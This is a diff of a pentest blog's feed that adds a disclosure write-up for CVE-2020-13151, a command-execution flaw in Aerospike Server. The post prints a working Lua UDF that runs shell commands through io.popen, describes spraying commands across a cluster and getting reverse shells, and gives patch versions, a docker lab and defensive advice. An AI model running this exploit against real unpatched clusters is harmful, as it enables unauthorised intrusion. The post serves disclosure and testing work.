@@ -1,4 +1,88 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://b4ny4n.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://b4ny4n.github.io/" rel="alternate" type="text/html" /><updated>2020-06-18T09:20:09-06:00</updated><id>https://b4ny4n.github.io/feed.xml</id><title type="html">-pentest notes-</title><subtitle>some security-related notes from the field, hopefully of use to other attackers/defenders...</subtitle><entry><title type="html">TICK Stack: Getting Kapacitor Shells via Chronograf</title><link href="https://b4ny4n.github.io/network-pentest/2020/06/17/kapacitor-shells-via-chronograph.html" rel="alternate" type="text/html" title="TICK Stack: Getting Kapacitor Shells via Chronograf" /><published>2020-06-17T00:00:00-06:00</published><updated>2020-06-17T00:00:00-06:00</updated><id>https://b4ny4n.github.io/network-pentest/2020/06/17/kapacitor-shells-via-chronograph</id><content type="html" xml:base="https://b4ny4n.github.io/network-pentest/2020/06/17/kapacitor-shells-via-chronograph.html">&lt;h1 id=&quot;motivation&quot;&gt;Motivation&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://b4ny4n.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://b4ny4n.github.io/" rel="alternate" type="text/html" /><updated>2020-08-01T08:37:10-06:00</updated><id>https://b4ny4n.github.io/feed.xml</id><title type="html">-pentest notes-</title><subtitle>some security-related notes from the field, hopefully of use to other attackers/defenders...</subtitle><entry><title type="html">CVE-2020-13151 POC: Aerospike Server Host Command Execution</title><link href="https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html" rel="alternate" type="text/html" title="CVE-2020-13151 POC: Aerospike Server Host Command Execution" /><published>2020-08-01T00:00:00-06:00</published><updated>2020-08-01T00:00:00-06:00</updated><id>https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike</id><content type="html" xml:base="https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html">&lt;h1 id=&quot;an-aside&quot;&gt;An Aside&lt;/h1&gt;
+
+&lt;p&gt;The Aerospike team was really great to work with on this CVE. They were very repsonsive and quickly developed a patch and worked it into production.&lt;/p&gt;
+
+&lt;h1 id=&quot;motivation&quot;&gt;Motivation&lt;/h1&gt;
+
+&lt;p&gt;I recently disclosed CVE-2020-13151 to Aerospike after finding that I could execute commands against the underlying aerospike database hosts during an engagement. If you find an unpatched version of Aeropike server during testing, there may be a quick shell available. Depending on what else the hosts are used for this can be a good pivot point in the network.&lt;/p&gt;
+
+&lt;h1 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;An unpatched (or non-hardened) version of the Aerospike server.&lt;/li&gt;
+  &lt;li&gt;Patches came in two stages:
+    &lt;ul&gt;
+      &lt;li&gt;Versions 5.0.0.7, 4.9.0.10, 4.8.0.13, 4.7.0.17, 4.6.0.19 and 4.5.3.21 received the ability to disable lua UDFs&lt;/li&gt;
+      &lt;li&gt;Versions 5.1.0.3 and beyond blocked the process creation in the UDFs&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Authentication is not offered on the community edition making the attack very simple on unpatched versions. I was unable to test this attack on the enterprise edition, so if you find one on an engagement, you’ll need to experiment a bit (and probably obtain some credentials).&lt;/p&gt;
+
+&lt;h1 id=&quot;exploiting&quot;&gt;Exploiting&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt;
+scripted exploit tool is here: &lt;a href=&quot;https://github.com/b4ny4n/CVE-2020-13151&quot;&gt;https://github.com/b4ny4n/CVE-2020-13151&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Again, this was only tested on the server community edition as I didn’t have access to the enterprise version. A nicety from an attacker point-of-view is that the community edition does not allow for authentication, making this attack very easy.&lt;/p&gt;
+
+&lt;p&gt;To show how it works, I’ll walk through a manual way to run the attack, though I’ve created a some tooling around it here &lt;a href=&quot;https://github.com/b4ny4n/CVE-2020-13151&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;This attack is possible due to inusfficient blacklisting of functions in lua UDFs. Aerospike seems to have (sensibly) blocked &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.execute&lt;/code&gt; calls during UDF execution, however the same precautions do not appear to be in place for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;io.popen&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Consider the following UDF, which when registered will allow us to execute and display the results of a command whichever host in the cluster ends up executing the function.&lt;/p&gt;
+
+&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;runCMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;outtext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;phandle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;io.popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;io.input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;phandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;io.lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;outtext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;outtext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;outtext&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once connected to the cluster (again, no auth in the community edition), we can register our udf:
+&lt;img src=&quot;/screens/aero-register-udf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Create a single-record test dataset to operate on:
+&lt;img src=&quot;/screens/aero-create-table.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And then execute commands on whichever host ended up hosting our record:
+&lt;img src=&quot;/screens/aero-execute-cmd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In a large enough cluster an attacker could create a much larger dataset and repeatedly execute the commands against different records which would have the effect of spraying the command around the cluster (which would be fun for dropping ssh keys, for example).&lt;/p&gt;
+
+&lt;h1 id=&quot;try-it-out&quot;&gt;Try it out&lt;/h1&gt;
+
+&lt;p&gt;I’ve written a tool which injects records into the target cluster and then executes the desired commands.&lt;/p&gt;
+
+&lt;p&gt;It can be used to obtain a reverse shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/screens/aero-revshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Or just to issue arbitrary commands:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/screens/aero-cmdexec.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can grab the tool &lt;a href=&quot;https://github.com/b4ny4n/CVE-2020-13151&quot;&gt;here&lt;/a&gt; and experiment with it against a local docker setup:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;c&quot;&gt;# start up a single-node aerospike instance&lt;/span&gt;
+docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; aerospike &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 3000:3000 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 3001:3001 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 3002:3002 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 3003:3003 aerospike:4.9.0.5
+
+&lt;span class=&quot;c&quot;&gt;# if you want to issue commands against the server interactively, &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# fire up a client to interact with the server (also dockerized)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# changing the --host IP as necessary&lt;/span&gt;
+docker run &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;:/share &lt;span class=&quot;nt&quot;&gt;-ti&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; aerospike-aql &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; aerospike/aerospike-tools aql &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt; 172.17.0.2 &lt;span class=&quot;nt&quot;&gt;--no-config-file&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;if-youre-defending&quot;&gt;If You’re Defending&lt;/h1&gt;
+
+&lt;p&gt;Patch and firewall off backend servers if you’re on the community edition (ideally, they should only respond to the web apps fronting them). If you’re on the enterprise version, ensure you have strong authentication and minimize permission and access.&lt;/p&gt;</content><author><name></name></author><summary type="html">An Aside</summary></entry><entry><title type="html">TICK Stack: Getting Kapacitor Shells via Chronograf</title><link href="https://b4ny4n.github.io/network-pentest/2020/06/17/kapacitor-shells-via-chronograph.html" rel="alternate" type="text/html" title="TICK Stack: Getting Kapacitor Shells via Chronograf" /><published>2020-06-17T00:00:00-06:00</published><updated>2020-06-17T00:00:00-06:00</updated><id>https://b4ny4n.github.io/network-pentest/2020/06/17/kapacitor-shells-via-chronograph</id><content type="html" xml:base="https://b4ny4n.github.io/network-pentest/2020/06/17/kapacitor-shells-via-chronograph.html">&lt;h1 id=&quot;motivation&quot;&gt;Motivation&lt;/h1&gt;
 
 &lt;p&gt;Depending on the devops culture of the teams you’re consulting with, you may come across the &lt;a href=&quot;https://www.influxdata.com/time-series-platform/&quot;&gt;TICK stack&lt;/a&gt; during an engagement. The TICK stack is a set of tools which makes metrics collection, system monitoring, and alerting easy for deployments. It’s also yet another set of tools which ships with no authentication by the default.&lt;/p&gt;
 
